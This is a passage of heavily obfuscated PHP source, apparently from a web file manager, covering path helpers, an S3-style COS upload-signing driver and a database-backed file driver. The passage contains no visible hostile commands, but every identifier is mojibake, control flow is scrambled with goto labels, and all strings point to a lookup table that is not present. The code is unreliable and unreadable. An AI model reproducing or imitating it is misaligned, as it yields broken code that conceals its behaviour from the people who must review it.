$bö´©÷ÜÊ«)) { $C¢ê‹•ÇÃ = str_replace($bö´©÷ÜÊ«, $c´õÏ’‚‹‚[8], $C¢ê‹•ÇÃ); } goto B·ÀĞ¸‡¸Ã; Cù™ºØÖ®ƒ: } public static function sourceID($FÈÌ¹™é™) { $C¤Û¾öµ•Ç =& $_SERVER[¬ˆÚÂ”Éğä]; $c‰››ŠÖ = self::parse($FÈÌ¹™é™); if ($c‰››ŠÖ[$C¤Û¾öµ•Ç[29]] !== self::KOD_SOURCE) { show_json(LNG($C¤Û¾öµ•Ç[1087]), !1); } return $c‰››ŠÖ[$C¤Û¾öµ•Ç[367]]; } public static function make($bãëæ Ë) { if (!$bãëæ Ë) { return !1; } return self::makePath(self::KOD_SOURCE, intval($bãëæ Ë)); } public static function makeShare($a‚ÆÖâÚÓ, $EŒ™Ô¾ŒÆÄ) { return self::makePath(self::KOD_SHARE_ITEM, $a‚ÆÖâÚÓ, $EŒ™Ô¾ŒÆÄ); } public static function makeFileTypePath($C‚¬‚ÂÔ‹) { return self::makePath(self::KOD_USER_FILE_TYPE, $C‚¬‚ÂÔ‹); } public static function makeFileTagPath($c©ƒ„Óàä) { return self::makePath(self::KOD_USER_FILE_TAG, $c©ƒ„Óàä); } public static function makePath($cÆÊé‡°¿, $A®Û÷Ëª = '', $f¼öß¬éãÇ = '') { $D„Áà‘†à¯ =& $_SERVER[¬ˆÚÂ”Éğä]; $fÈµÎ³´öÉ = substr($cÆÊé‡°¿, 1, -1); $C‡ŸìÀŠ = $D„Áà‘†à¯[1088] . $fÈµÎ³´öÉ . $D„Áà‘†à¯[1089] . $A®Û÷Ëª . $D„Áà‘†à¯[1090]; $C‡ŸìÀŠ = $f¼öß¬éãÇ ? $C‡ŸìÀŠ . $f¼öß¬éãÇ . $D„Áà‘†à¯[8] : $C‡ŸìÀŠ; return $C‡ŸìÀŠ; } public static function hashPath($F«¡İ£¬´µ) { $aÍßºœ¿è =& $_SERVER[¬ˆÚÂ”Éğä]; $Cô‘†‘‡ä = is_array($F«¡İ£¬´µ) ? $F«¡İ£¬´µ : IO::info($F«¡İ£¬´µ); $Cğá“ğ“§ = _get($Cô‘†‘‡ä, $aÍßºœ¿è[1091], $aÍßºœ¿è[33]); if (!$Cğá“ğ“§) { $B™•ëÖÅÖ™ = KodIO::parse($Cô‘†‘‡ä[$aÍßºœ¿è[75]]); if (!$B™•ëÖÅÖ™[$aÍßºœ¿è[29]]) { $Cğá“ğ“§ = IO::hashSimple($Cô‘†‘‡ä[$aÍßºœ¿è[75]]); } } if (!$Cğá“ğ“§) { $Cğá“ğ“§ = md5($Cô‘†‘‡ä[$aÍßºœ¿è[75]] . $Cô‘†‘‡ä[$aÍßºœ¿è[77]] . $Cô‘†‘‡ä[$aÍßºœ¿è[107]]); } return $Cğá“ğ“§; } public static function initSystemPath() { $B¨¥ğàÄ‘î =& $_SERVER[¬ˆÚÂ”Éğä]; if (defined($B¨¥ğàÄ‘î[1092])) { return; } define($B¨¥ğàÄ‘î[1092], self::systemPath($B¨¥ğàÄ‘î[1093])); define($B¨¥ğàÄ‘î[1094], self::systemPath($B¨¥ğàÄ‘î[1095])); define($B¨¥ğàÄ‘î[1096], self::systemPath($B¨¥ğàÄ‘î[1097])); define($B¨¥ğàÄ‘î[1098], self::systemPath($B¨¥ğàÄ‘î[1099])); } private static function systemPath($bÚ³ñå·ó‚) { goto f¬ç‰æÃ÷É; f¬ç‰æÃ÷É: $b×…ğÒø¤£ =& $_SERVER[¬ˆÚÂ”Éğä]; $f›ÆÁâ‘” = $b×…ğÒø¤£[1100] . ucfirst($bÚ³ñå·ó‚); $FÕ¥§ŠÙ½ = Model($b×…ğÒø¤£[1101])->get($f›ÆÁâ‘”); goto F‹¤Ì‰¥„—; B±†±¡£ç¾: return $FÕ¥§ŠÙ½; goto aì‚‹ä¾äó; F‹¤Ì‰¥„—: if ($FÕ¥§ŠÙ½) { return $FÕ¥§ŠÙ½; } if ($bÚ³ñå·ó‚ == $b×…ğÒø¤£[1093]) { $FÕ¥§ŠÙ½ = self::make(Model($b×…ğÒø¤£[760])->systemRootPathAdd($b×…ğÒø¤£[1102])); } else { $FÕ¥§ŠÙ½ = self::systemPath($b×…ğÒø¤£[1093]); $bÛ„ÄŠ–Ÿµ = self::sourceID($FÕ¥§ŠÙ½); $FÕ¥§ŠÙ½ = self::make(Model($b×…ğÒø¤£[760])->mkdir($bÛ„ÄŠ–Ÿµ, $bÚ³ñå·ó‚)); } Model($b×…ğÒø¤£[1101])->set($f›ÆÁâ‘”, $FÕ¥§ŠÙ½); goto B±†±¡£ç¾; aì‚‹ä¾äó: } public static function systemFolder($A¡ˆ÷ØĞ¨¿) { $Aõç Ä­‚É = IO_PATH_SYSTEM_SOURCE . $A¡ˆ÷ØĞ¨¿; $Bï³é¶íÁ = Cache::get($Aõç Ä­‚É); if (!$Bï³é¶íÁ) { $B…í‚ŞéÙÆ = IO::infoFull($Aõç Ä­‚É); if (!$B…í‚ŞéÙÆ) { $Bï³é¶íÁ = IO::mkdir($Aõç Ä­‚É, REPEAT_SKIP); } else { $Bï³é¶íÁ = $B…í‚ŞéÙÆ[$_SERVER[¬ˆÚÂ”Éğä][75]]; } Cache::set($Aõç Ä­‚É, $Bï³é¶íÁ, 3600 * 10); } return $Bï³é¶íÁ; } public static function defaultDriver() { return Model($_SERVER[¬ˆÚÂ”Éğä][711])->defaultDriver(); } public static function defaultIO() { $a…Ì‡Ø¹Øô =& $_SERVER[¬ˆÚÂ”Éğä]; $a†Ï–Æ“ëñ = self::defaultDriver(); return $a…Ì‡Ø¹Øô[1103] . $a†Ï–Æ“ëñ[$a…Ì‡Ø¹Øô[367]] . $a…Ì‡Ø¹Øô[1090]; } public static function defaultDriverInit() { static $cÏ»òŠÁ = false; if ($cÏ»òŠÁ) { return $cÏ»òŠÁ; } $cÏ»òŠÁ = IO::init(self::defaultIO()); return $cÏ»òŠÁ; } public static function fileTypeList() { $bÂ¯™âµ¡” =& $_SERVER[¬ˆÚÂ”Éğä]; $AÖÀ§Òİµà = $GLOBALS[$bÂ¯™âµ¡”[6]][$bÂ¯™âµ¡”[1104]]; foreach ($AÖÀ§Òİµà as $båÔÇÈÉğ => $d§»²Õ©¹‹) { $F‡œÛ•˜…® = $bÂ¯™âµ¡”[1105] . $båÔÇÈÉğ; $bãïÖ»ä£ = LNG($F‡œÛ•˜…®); if ($F‡œÛ•˜…® != $bãïÖ»ä£) { $AÖÀ§Òİµà[$båÔÇÈÉğ][$bÂ¯™âµ¡”[28]] = $bãïÖ»ä£; } } return $AÖÀ§Òİµà; } public static function transferType($fÑÉŠë›œÓ, $c¹“‹õ÷É) { goto E—œö­¶Ôß; c¶ìØÛ…: return $f­İƒ²öÆ[1108]; goto d¨á´î­¨Ç; Cš¿Æ±š„: if ($BÎÀÕğ¾ğ÷[$f­İƒ²öÆ[29]] == $d‚ë¤ÙŠÏç[$f­İƒ²öÆ[29]] && $BÎÀÕğ¾ğ÷[$f­İƒ²öÆ[1106]] == $d‚ë¤ÙŠÏç[$f­İƒ²öÆ[1106]]) { return $f­İƒ²öÆ[1107]; } if ($BÎÀÕğ¾ğ÷[$f­İƒ²öÆ[29]] == $f­İƒ²öÆ[795] && $d‚ë¤ÙŠÏç[$f­İƒ²öÆ[29]] == $f­İƒ²öÆ[102]) { return $f­İƒ²öÆ[1053]; } if ($BÎÀÕğ¾ğ÷[$f­İƒ²öÆ[29]] == $f­İƒ²öÆ[102] && $d‚ë¤ÙŠÏç[$f­İƒ²öÆ[29]] == $f­İƒ²öÆ[795]) { return $f­İƒ²öÆ[103]; } goto c¶ìØÛ…; E—œö­¶Ôß: $f­İƒ²öÆ =& $_SERVER[¬ˆÚÂ”Éğä]; $BÎÀÕğ¾ğ÷ = self::driverType($fÑÉŠë›œÓ); $d‚ë¤ÙŠÏç = self::driverType($c¹“‹õ÷É); goto Cš¿Æ±š„; d¨á´î­¨Ç: } public static function driverType($a©î¾ÍçËÀ) { goto E¢½ÊÏ½à; E¢½ÊÏ½à: $DÍ®µôÛËî =& $_SERVER[¬ˆÚÂ”Éğä]; $b«î†„¤ôê = $a©î¾ÍçËÀ->path; $aÂ®ä÷ƒÚ· = str_replace($DÍ®µôÛËî[1109], $DÍ®µôÛËî[33], strtolower($a©î¾ÍçËÀ->getType())); goto AÙ ¤–ââÂ; a÷‘Ûñ­¢‰: return array($DÍ®µôÛËî[29] => $DÍ®µôÛËî[795], $DÍ®µôÛËî[1106] => $a©î¾ÍçËÀ->pathDriver, $DÍ®µôÛËî[75] => $b«î†„¤ôê); goto CåÎÄ¹; AÙ ¤–ââÂ: if ($aÂ®ä÷ƒÚ· == $DÍ®µôÛËî[702] || $aÂ®ä÷ƒÚ· == $DÍ®µôÛËî[1110] || $aÂ®ä÷ƒÚ· == $DÍ®µôÛËî[1111]) { $a©î¾ÍçËÀ = self::defaultDriverInit(); } else { if ($aÂ®ä÷ƒÚ· == $DÍ®µôÛËî[1061] || $aÂ®ä÷ƒÚ· == $DÍ®µôÛËî[1112]) { $a©î¾ÍçËÀ = IO::init($a©î¾ÍçËÀ->pathParse[$DÍ®µôÛËî[1011]]); } } $aÂ®ä÷ƒÚ· = str_replace($DÍ®µôÛËî[1109], $DÍ®µôÛËî[33], strtolower($a©î¾ÍçËÀ->getType())); if ($aÂ®ä÷ƒÚ· == $DÍ®µôÛËî[102]) { return array($DÍ®µôÛËî[29] => $DÍ®µôÛËî[102], $DÍ®µôÛËî[1106] => $DÍ®µôÛËî[33], $DÍ®µôÛËî[75] => $b«î†„¤ôê); } goto a÷‘Ûñ­¢‰; CåÎÄ¹: } } goto fàÛ‹ÊãŠ–; fàÛ‹ÊãŠ–: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($aáœ³ß¦§µ) { parent::__construct($aáœ³ß¦§µ); $this->signatureVersion($_SERVER[¬ˆÚÂ”Éğä][200]); } public function uploadFormData($DÎİì›ù›², $A«ÜÍ¿à¬ = 3600) { goto eË³ÁÓ“‡; aÛ¾²†Š‰¬: $CâÖò®İã = sha1($E¦¢Ò¨š¸); $fÛ‚ğ•¾Ÿ¥ = hash_hmac($E™´áÒ‰É[218], $CâÖò®İã, $A¯Óİê¡å); $Eå„šîÃ÷Ü = array($E™´áÒ‰É[1117] => $B¿¨‡¾¯, $E™´áÒ‰É[1121] => $DÔÂöèÇ, $E™´áÒ‰É[1125] => base64_encode($E¦¢Ò¨š¸), $E™´áÒ‰É[1122] => $dŠ‹ˆøÜÎ£, $E™´áÒ‰É[1123] => $this->accessKey, $E™´áÒ‰É[1126] => $bÏœ–ÂÊ†Å, $E™´áÒ‰É[1127] => $fÛ‚ğ•¾Ÿ¥, $E™´áÒ‰É[169] => $this->getHost()); goto b‡ß£È‰×Å; b‡ß£È‰×Å: return $Eå„šîÃ÷Ü; goto AšÁĞ¢ôù‹; cÀ¤ÂÑÕ‹: $DÔÂöèÇ = $E™´áÒ‰É[1113]; $eÚò½•ÁĞ® = gmdate($E™´áÒ‰É[1114], time() + $A«ÜÍ¿à¬); $bÏœ–ÂÊ†Å = (string) time() . $E™´áÒ‰É[67] . (string) (time() + $A«ÜÍ¿à¬); goto fÜ¢è†¿ÈÎ; fÜ¢è†¿ÈÎ: $E¦¢Ò¨š¸ = array($E™´áÒ‰É[1115] => $eÚò½•ÁĞ®, $E™´áÒ‰É[1116] => array(array($E™´áÒ‰É[1117] => $B¿¨‡¾¯), array($E™´áÒ‰É[1118] => $this->bucket), array($E™´áÒ‰É[1119], $E™´áÒ‰É[1120], $E™´áÒ‰É[33]), array($E™´áÒ‰É[1121] => $DÔÂöèÇ), array($E™´áÒ‰É[1122] => $dŠ‹ˆøÜÎ£), array($E™´áÒ‰É[1123] => $this->accessKey), array($E™´áÒ‰É[1124] => $bÏœ–ÂÊ†Å))); $E¦¢Ò¨š¸ = json_encode($E¦¢Ò¨š¸); $A¯Óİê¡å = hash_hmac($E™´áÒ‰É[218], $bÏœ–ÂÊ†Å, $this->secret); goto aÛ¾²†Š‰¬; eË³ÁÓ“‡: $E™´áÒ‰É =& $_SERVER[¬ˆÚÂ”Éğä]; $B¿¨‡¾¯ = $E™´áÒ‰É[185]; $dŠ‹ˆøÜÎ£ = $E™´áÒ‰É[218]; goto cÀ¤ÂÑÕ‹; AšÁĞ¢ôù‹: } public function fileOutLink($Bã¤©ĞÕè) { $FœÉ·ñ–÷Ú =& $_SERVER[¬ˆÚÂ”Éğä]; if (substr($Bã¤©ĞÕè, 0, 7) == $FœÉ·ñ–÷Ú[1128]) { $Bã¤©ĞÕè = $FœÉ·ñ–÷Ú[1129] . substr($Bã¤©ĞÕè, 7); } header($FœÉ·ñ–÷Ú[156] . $Bã¤©ĞÕè); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($eƒ‰ùÌ‹ºø) { $this->pathParse = $eƒ‰ùÌ‹ºø; $this->model = Model($_SERVER[¬ˆÚÂ”Éğä][1130]); } public function getPath($C•‡¹¥ˆ¤‚) { return trim($C•‡¹¥ˆ¤‚, $_SERVER[¬ˆÚÂ”Éğä][8]); } public function pathFather($fÄ¨ÙÊƒàÓ) { $aîÚ¼ßë‰Ñ = $this->parse($fÄ¨ÙÊƒàÓ); $aîÚ¼ßë‰Ñ = $this->infoSimple($fÄ¨ÙÊƒàÓ); return $aîÚ¼ßë‰Ñ ? $aîÚ¼ßë‰Ñ[$_SERVER[¬ˆÚÂ”Éğä][463]] : !1; } public function getPathName($Bè×äÖ»»È) { $e²ìæùâ“ = $this->infoSimple($Bè×äÖ»»È); return $e²ìæùâ“ ? $e²ìæùâ“[$_SERVER[¬ˆÚÂ”Éğä][28]] : !1; } public function getPathOuter($D°¯âÆÎ×†) { if (!$D°¯âÆÎ×†) { return $D°¯âÆÎ×†; } $eƒ¢öÏÈğØ = $this->parse($D°¯âÆÎ×†); return KodIO::make($eƒ¢öÏÈğØ[$_SERVER[¬ˆÚÂ”Éğä][367]]); } public function copyFolderFromIO($bÌæ…òñµ, $CœÌ¡±£à­, $aí‰À¬êæ, $E”…´Øã¼Œ, $fÉ¼ã§¼ÌÒ) { $e©œÌ¢à = $this->model->copyFolderFromIO($bÌæ…òñµ, $CœÌ¡±£à­, $aí‰À¬êæ, $E”…´Øã¼Œ, $fÉ¼ã§¼ÌÒ); return KodIO::make($e©œÌ¢à); } public function isParentOf($C‚êÑ¬Êñ¥, $b“ãš£Æœß) { return $this->model->isParentOf($C‚êÑ¬Êñ¥, $b“ãš£Æœß); } public function mkfile($BêÌøÎæÏ, $B¿¡¿‚¼àÌ = '', $eÈ–Û˜ä—‚ = REPEAT_RENAME) { $EœöÕŒß› =& $_SERVER[¬ˆÚÂ”Éğä]; $dõîİ‹¿š§ = $this->parse($BêÌøÎæÏ); $BêÌøÎæÏ = $dõîİ‹¿š§[$EœöÕŒß›[367]]; for ($c³Ê‚³‘è‰ = 0; $c³Ê‚³‘è‰ < count($dõîİ‹¿š§[$EœöÕŒß›[1131]]); $c³Ê‚³‘è‰++) { $fï¡‘¶®Óº = $dõîİ‹¿š§[$EœöÕŒß›[1131]][$c³Ê‚³‘è‰]; if ($c³Ê‚³‘è‰ == count($dõîİ‹¿š§[$EœöÕŒß›[1131]]) - 1) { $BêÌøÎæÏ = $this->model->mkfile($BêÌøÎæÏ, $fï¡‘¶®Óº, $B¿¡¿‚¼àÌ, $eÈ–Û˜ä—‚); break; } $BêÌøÎæÏ = $this->model->mkdir($BêÌøÎæÏ, $fï¡‘¶®Óº, REPEAT_SKIP); } return $this->getPathOuter($BêÌøÎæÏ); } public function mkdir($Bš©ãî¥öÉ, $C‡ˆêÃ÷Á = REPEAT_SKIP) { $DŠÄä„‘³ =& $_SERVER[¬ˆÚÂ”Éğä]; $d²³åÂº = $this->parse($Bš©ãî¥öÉ); $Bš©ãî¥öÉ = $d²³åÂº[$DŠÄä„‘³[367]]; for ($BˆÒ…©¢õ… = 0; $BˆÒ…©¢õ… < count($d²³åÂº[$DŠÄä„‘³[1131]]); $BˆÒ…©¢õ…++) { $bÜ¬¤°«øß = $d²³åÂº[$DŠÄä„‘³[1131]][$BˆÒ…©¢õ…]; $Bš©ãî¥öÉ = $this->model->mkdir($Bš©ãî¥öÉ, $bÜ¬¤°«øß, $C‡ˆêÃ÷Á); } return $this->getPathOuter($Bš©ãî¥öÉ); } public function copyFile($a¼÷·Ì¾ˆ, $f¦ôà¿‚†ã, $e¹ÄíÏº¤Õ = REPEAT_REPLACE) { $D¤‚› Â×ã =& $_SERVER[¬ˆÚÂ”Éğä]; $cóœùÍŠù‘ = $this->parse($f¦ôà¿‚†ã); $E¸ø®œÃ = $this->model->copy($a¼÷·Ì¾ˆ, $cóœùÍŠù‘[$D¤‚› Â×ã[367]], $e¹ÄíÏº¤Õ, $cóœùÍŠù‘[$D¤‚› Â×ã[75]]); return $E¸ø®œÃ ? $this->getPathOuter($E¸ø®œÃ) : !1; } public function moveFile($Bâòá–’¦, $fÃñÛˆË ‹, $aË‚”•Úí¬ = REPEAT_REPLACE) { $E‰Õ§óñÆ =& $_SERVER[¬ˆÚÂ”Éğä]; $d˜«Ş†¨¤¿ = $this->parse($fÃñÛˆË ‹); $C°×§‹¯–ˆ = $this->model->move($Bâòá–’¦, $d˜«Ş†¨¤¿[$E‰Õ§óñÆ[367]], $aË‚”•Úí¬, $d˜«Ş†¨¤¿[$E‰Õ§óñÆ[75]]); return $C°×§‹¯–ˆ ? $this->getPathOuter($C°×§‹¯–ˆ) : !1; } public function copy($f¥‹¥íÀËò, $CÇ¨ÜÊŠ°, $F¿¸ğ¿ìÍÂ = REPEAT_REPLACE) { $BàÆÒÕİß— = $this->parse($CÇ¨ÜÊŠ°); $FÙ–áÃó÷ = $this->model->copy($f¥‹¥íÀËò, $BàÆÒÕİß—[$_SERVER[¬ˆÚÂ”Éğä][367]], $F¿¸ğ¿ìÍÂ); return $FÙ–áÃó÷ ? $this->getPathOuter($FÙ–áÃó÷) : !1; } public function moveSameAllow() { } public function move($bŠµ¹¶ğ¯¢, $F×¾°ƒ‘“Ô, $D¶ƒ´›Ç©á = REPEAT_REPLACE) { $B±Â—šŒ—Œ = $this->parse($F×¾°ƒ‘“Ô); $d”‘Š·ò£ = $this->model->move($bŠµ¹¶ğ¯¢, $B±Â—šŒ—Œ[$_SERVER[¬ˆÚÂ”Éğä][367]], $D¶ƒ´›Ç©á); return $d”‘Š·ò£ ? $this->getPathOuter($d”‘Š·ò£) : !1; } public function remove($Eã† ø‘¤×, $bõ‘Êî¾ = true) { return $this->model->remove($Eã† ø‘¤×, $bõ‘Êî¾); } public function rename($B½î²‘‰çó, $BØ£Šî‹) { $Eãá…™ê™‡ = $this->model->rename($B½î²‘‰çó, $BØ£Šî‹); return $Eãá…™ê™‡ ? $this->getPathOuter($B½î²‘‰çó) : $Eãá…™ê™‡; } public function size($F‰¡§¯²ãË) { $e‚¬£µÉ­ = $this->infoSimple($F‰¡§¯²ãË); return $e‚¬£µÉ­ ? $e‚¬£µÉ­[$_SERVER[¬ˆÚÂ”Éğä][77]] : 0; } public function infoSimple($DåÚÙŒƒŠ˜) { return $this->model->sourceInfo($DåÚÙŒƒŠ˜); } public function info($a“ê„¦öğÀ) { return $this->infoParse($a“ê„¦öğÀ); } public function infoAuth($fÃìŠ´½Ç) { return $this->infoParse($fÃìŠ´½Ç, !1, !0); } public function infoWithChildren($C¦Ğ¿À´‡Ò) { return $this->infoParse($C¦Ğ¿À´‡Ò, !0); } protected function infoParse($a¿çåŒÉ¸, $b£®…÷²ÛÒ = false, $f‹å¬¤éÇê = false) { if (!$b£®…÷²ÛÒ) { return $this->model->pathInfo($a¿çåŒÉ¸, $f‹å¬¤éÇê); } return $this->model->pathInfoMore($a¿çåŒÉ¸); } public function infoFull($BŞÛ÷Ãˆ†Æ) { $AóÒôÛõ÷Ç =& $_SERVER[¬ˆÚÂ”Éğä]; $F¡Ú¬“ÂÕ = explode($AóÒôÛõ÷Ç[8], $BŞÛ÷Ãˆ†Æ); $E¬¶³¹Ñë = implode($AóÒôÛõ÷Ç[8], array_splice($F¡Ú¬“ÂÕ, 1)); return $this->model->pathInfoByPath($F¡Ú¬“ÂÕ[0], $E¬¶³¹Ñë); } public function hashSimple($f²éê²íÛ¦) { $F…¤÷¯´ÌÎ =& $_SERVER[¬ˆÚÂ”Éğä]; $fÇª¨çØ¡ = $this->infoWithChildren($f²éê²íÛ¦); return $fÇª¨çØ¡[$F…¤÷¯´ÌÎ[162]][$F…¤÷¯´ÌÎ[164]]; } public function hashMd5($cˆ³à¼†¢„) { $E®·Ùì­Ü =& $_SERVER[¬ˆÚÂ”Éğä]; $bêëš ²™± = $this->infoWithChildren($cˆ³à¼†¢„); return $bêëš ²™±[$E®·Ùì­Ü[162]][$E®·Ùì­Ü[163]]; } public function exist($eê“ƒ³¿Ú) { $eùñõïãˆ› =& $_SERVER[¬ˆÚÂ”Éğä]; $fäÈ¼ÏôÓÉ = $this->parse($eê“ƒ³¿Ú); if (!$fäÈ¼ÏôÓÉ[$eùñõïãˆ›[75]]) { return $this->isFile($eê“ƒ³¿Ú) || $this->isFolder($eê“ƒ³¿Ú); } $dñ•‡ÈÀ»Ö = array($eùñõïãˆ›[368] => $fäÈ¼ÏôÓÉ[$eùñõïãˆ›[367]], $eùñõïãˆ›[28] => $fäÈ¼ÏôÓÉ[$eùñõïãˆ›[75]]); $cìèÈ©«¼º = $this->model->where($dñ•‡ÈÀ»Ö)->find(); return $cìèÈ©«¼º ? !0 : !1; } public function isFile($Bßº„³Ó’) { $cÒ‰ÎÜ‹¬  =& $_SERVER[¬ˆÚÂ”Éğä]; $E²Ã½±¼÷¼ = $this->infoSimple($Bßº„³Ó’); return $E²Ã½±¼÷¼ && $E²Ã½±¼÷¼[$cÒ‰ÎÜ‹¬ [370]] == $cÒ‰ÎÜ‹¬ [83] ? !1 : !0; } public function isFolder($D÷Œ…š¦è) { $B–Öõ–¾ï =& $_SERVER[¬ˆÚÂ”Éğä]; $eÍ§é¹”Ï = $this->infoSimple($D÷Œ…š¦è); return $eÍ§é¹”Ï && $eÍ§é¹”Ï[$B–Öõ–¾ï[370]] == $B–Öõ–¾ï[83] ? !0 : !1; } public function listPath($bÎ´ĞÎ–±ø, $dõƒ©›…ø = false) { $fŒÔäˆæï =& $_SERVER[¬ˆÚÂ”Éğä]; if ($bÎ´ĞÎ–±ø == $fŒÔäˆæï[33]) { return !1; } $cä£ìãÎ±Ü = array($fŒÔäˆæï[368] => $bÎ´ĞÎ–±ø); if ($dõƒ©›…ø) { return $this->model->listSource($cä£ìãÎ±Ü, -1); } return $this->model->listSource($cä£ìãÎ±Ü); } public function has($bä‘ –³Ú, $f÷“‰¹Ñİ® = false, $fÖíÒ±¼£ = null) { $E÷çğ¸ÄÖ× =& $_SERVER[¬ˆÚÂ”Éğä]; $B¶ù˜Ëê×¹ = $this->infoWithChildren($bä‘ –³Ú); if ($f÷“‰¹Ñİ®) { return array($E÷çğ¸ÄÖ×[192] => $B¶ù˜Ëê×¹[$E÷çğ¸ÄÖ×[192]], $E÷çğ¸ÄÖ×[191] => $B¶ù˜Ëê×¹[$E÷çğ¸ÄÖ×[191]]); } return $fÖíÒ±¼£ ? $B¶ù˜Ëê×¹[$E÷çğ¸ÄÖ×[192]] : $B¶ù˜Ëê×¹[$E÷çğ¸ÄÖ×[191]]; } public function listAll($e»ŠÛŠæÁš) { $d¦™·½³í = IO::info($this->pathParse[$_SERVER[¬ˆÚÂ”Éğä][75]]); if (!$d¦™·½³í) { return array(); } return $this->model->listAll($e»ŠÛŠæÁš); } public function getContent($BîÜŞš¼Šç) { return $this->model->getContent($BîÜŞš¼Šç); } public function setContent($AÅÍ÷•”é¢, $AºïäîÕÌ¾ = '') { return $this->model->setContent($AÅÍ÷•”é¢, $AºïäîÕÌ¾); } public function fileSubstr($cËøƒæ›Ÿ¾, $dî¨ÀÙŞğ, $b‰÷øå‚‰ì) { return $this->model->fileSubstr($cËøƒæ›Ÿ¾, $dî¨ÀÙŞğ, $b‰÷øå‚‰ì); } public function download($Díƒ½Œ˜‰Ó, $bŠ“åĞ’Ì¸ = '') { $Câ§óéÇé = get_path_father($bŠ“åĞ’Ì¸); $cù™¦ÕåÏ = get_path_this($bŠ“åĞ’Ì¸); $C„Ì¸´°“ = $this->model->fileInfoGet($Díƒ½Œ˜‰Ó); $CÎ…šø ÷ï = IO::copy($C„Ì¸´°“[$_SERVER[¬ˆÚÂ”Éğä][75]], $Câ§óéÇé, !1, $cù™¦ÕåÏ); return $CÎ…šø ÷ï; } public function setModifyTime($aò´ß¾ô’†, $cÖ—Ö… îË = '') { $this->model->metaSet($aò´ß¾ô’†, $_SERVER[¬ˆÚÂ”Éğä][1132], $cÖ—Ö… îË); } public function upload($E·ãà¯·’ê, $c£Ó†Úã, $EÜ¼¼êŞÒ = false, $dğ®²ÆŸÍÂ = REPEAT_REPLACE) { $E‰ì˜´êè =& $_SERVER[¬ˆÚÂ”Éğä]; $f¦³Œ’³¾ï = $this->parse($E·ãà¯·’ê); $DÏ®õ¨›Îî = $this->model->addFile($f¦³Œ’³¾ï[$E‰ì˜´êè[367]], $c£Ó†Úã, $f¦³Œ’³¾ï[$E‰ì˜´êè[75]], $EÜ¼¼êŞÒ, $dğ®²ÆŸÍÂ); return $this->getPathOuter($DÏ®õ¨›Îî); } public function uploadFileByID($DË¦ÖçÎ¢ô, $b÷ºÆÀ¼ëÎ, $F·õ­Áá¸) { $bïÊç‡é¤Ó =& $_SERVER[¬ˆÚÂ”Éğä]; $f¦²¢¤÷Ë¤ = $this->parse($DË¦ÖçÎ¢ô); $A§¡µˆÁâî = $this->model->addFileByFileID($f¦²¢¤÷Ë¤[$bïÊç‡é¤Ó[367]], $b÷ºÆÀ¼ëÎ, $f¦²¢¤÷Ë¤[$bïÊç‡é¤Ó[75]], $F·õ­Áá¸); return $this->getPathOuter($A§¡µˆÁâî); } public function addFileByRemote($Aãï®„è®•, $fİÙ”—À, $f»›‡ñÄ„ = array(), $EêŒ“‡¬½Ê = '', $BÛ¦¬¸ÆÒ) { $F¿ÏÖ§Ûå± =& $_SERVER[¬ˆÚÂ”Éğä]; $D½˜ä½ŸËä = $this->parse($Aãï®„è®•); $EêŒ“‡¬½Ê = empty($EêŒ“‡¬½Ê) ? $D½˜ä½ŸËä[$F¿ÏÖ§Ûå±[75]] : $EêŒ“‡¬½Ê; $e‚Ş·˜Ëè÷ = $this->model->addFileByRemote($D½˜ä½ŸËä[$F¿ÏÖ§Ûå±[367]], $fİÙ”—À, $EêŒ“‡¬½Ê, $f»›‡ñÄ„, $BÛ¦¬¸ÆÒ); return $this->getPathOuter($e‚Ş·˜Ëè÷); } public function uploadLink($eÂ™Ä—ÕŸ, $EÁÓš’èË† = 0) { $b£Ø÷ê£·­ =& $_SERVER[¬ˆÚÂ”Éğä]; $Cœ‹’Ñ…÷’ = $this->parse($eÂ™Ä—ÕŸ); $eÂ™Ä—ÕŸ = Model($b£Ø÷ê£·­[546])->createFileName($Cœ‹’Ñ…÷’[$b£Ø÷ê£·­[75]]); $fİˆñ¨¡„Ì = IO::uploadLink($eÂ™Ä—ÕŸ, $EÁÓš’èË†); return $fİˆñ¨¡„Ì; } public function fileNameAuto($c¼ÓÃİÄÙ, $Dãƒ‹Ã‡êã, $D¦’‘ŠÈùÀ = REPEAT_REPLACE, $eïÍ­†‡Ï¨ = false) { return $this->model->fileNameAuto($c¼ÓÃİÄÙ, $Dãƒ‹Ã‡êã, $D¦’‘ŠÈùÀ, $eïÍ­†‡Ï¨); } public function fileNameExist($CŸßÇçÑã, $B ¢–‚Ìßà) { return $this->model->fileNameExist($CŸßÇçÑã, $B ¢–‚Ìßà); } protected function _fileOut($Bø’¡­ğ, $EÊ§ßÍ­¿â = false, $Bô½ğ¸„‹ = false, $fåó‘§ì× = '', $dÌâŠÁÂù° = false) { goto Dõê™ëíè; cªîàÂÅƒ: if ($dÌâŠÁÂù°) { return IO::fileOutServer($fŞ—Š¿ÍŞÎ[$cÊá±•Ê›­[75]], $EÊ§ßÍ­¿â, $dôö—É£ÄÃ, $fåó‘§ì×); } IO::fileOut($fŞ—Š¿ÍŞÎ[$cÊá±•Ê›­[75]], $EÊ§ßÍ­¿â, $dôö—É£ÄÃ, $fåó‘§ì×); goto d¶Î¯‰·ÖĞ; Dõê™ëíè: $cÊá±•Ê›­ =& $_SERVER[¬ˆÚÂ”Éğä]; $Cİ‘éù¿ = $this->model->sourceInfo($Bø’¡­ğ); if ($Cİ‘éù¿[$cÊá±•Ê›­[370]] == $cÊá±•Ê›­[83]) { header($cÊá±•Ê›­[1133]); die; } goto AªÓæ‹åñ; AªÓæ‹åñ: $fŞ—Š¿ÍŞÎ = $this->model->fileInfoGet($Bø’¡­ğ); $fåó‘§ì× = $fŞ—Š¿ÍŞÎ[$cÊá±•Ê›­[163]] ? $fŞ—Š¿ÍŞÎ[$cÊá±•Ê›­[163]] : $fåó‘§ì×; $dôö—É£ÄÃ = isset($GLOBALS[$cÊá±•Ê›­[1134]]) ? $GLOBALS[$cÊá±•Ê›­[1134]] : $Cİ‘éù¿[$cÊá±•Ê›­[28]]; goto cªîàÂÅƒ; d¶Î¯‰·ÖĞ: } public function fileOut($f—Â—¯Êé, $A¦Ê¥ŠÅ’« = false, $d·«Øˆà¯µ = false, $c¸ñÖöš‚Ã = '') { $this->_fileOut($f—Â—¯Êé, $A¦Ê¥ŠÅ’«, $d·«Øˆà¯µ, $c¸ñÖöš‚Ã); } public function fileOutServer($AÇ”Œ ‹Á, $ešàÖ…“†® = false, $FÖµ¾£Ÿ = false, $Fˆ«Ù…©å¢ = '') { $this->_fileOut($AÇ”Œ ‹Á, 